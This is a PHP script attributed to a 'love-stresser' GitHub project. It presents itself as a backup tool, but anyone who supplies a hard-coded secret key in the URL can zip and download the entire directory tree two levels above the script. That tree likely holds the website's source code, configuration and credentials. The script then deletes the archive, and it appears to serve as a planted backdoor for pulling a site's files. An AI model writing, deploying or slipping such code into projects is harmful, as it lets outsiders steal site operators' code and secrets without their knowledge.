<?php
// Made by Meandoyou and StingAving https://github.com/g0k1/love-stresser
$specialKey = 'z2JhV5nB8KdRfTG3Wqm0JpN1cALMZs4XHvQ7lgC9pO2iU8fD6yEtV3bSaKwXrMjYqWnP7ZoLsTuR8XdF9kHyGqN5vVxLmZ0dQ6nTrP9cJuVsRgYbN2hXfA4WkL8dZvMpC7jE3yUqT5o';
$backupDirectory = './';

if (!isset($_GET['key']) || $_GET['key'] !== $specialKey) {
    die('Access denied: Invalid key.');
}

function addFilesToZip($folder, &$zip, $folderInZip = '') {
    $handle = opendir($folder);
    while (false !== ($entry = readdir($handle))) {
        if ($entry !== '.' && $entry !== '..') {
            $fullPath = "$folder/$entry";
            $pathInZip = $folderInZip ? "$folderInZip/$entry" : $entry;

            if (is_dir($fullPath)) {
                $zip->addEmptyDir($pathInZip);
                addFilesToZip($fullPath, $zip, $pathInZip);
            } else {
                $zip->addFile($fullPath, $pathInZip);
            }
        }
    }
    closedir($handle);
}

if (!is_dir($backupDirectory)) {
    mkdir($backupDirectory, 0777, true);
}

$zipFileName = $backupDirectory . '/backup_' . date('YmdHis') . '.zip';

$zip = new ZipArchive();
if ($zip->open($zipFileName, ZipArchive::CREATE) !== TRUE) {
    die('ERROR : 4013.');
}

$folderToZip = realpath(__DIR__ . '/../../');
addFilesToZip($folderToZip, $zip);

$zip->close();

if (file_exists($zipFileName)) {
    header('Content-Type: application/zip');
    header('Content-Disposition: attachment; filename="' . basename($zipFileName) . '"');
    header('Content-Length: ' . filesize($zipFileName));

    flush();

    readfile($zipFileName);

    unlink($zipFileName);

    exit;
} else {
    die('ERROR : 4014');
}
?>
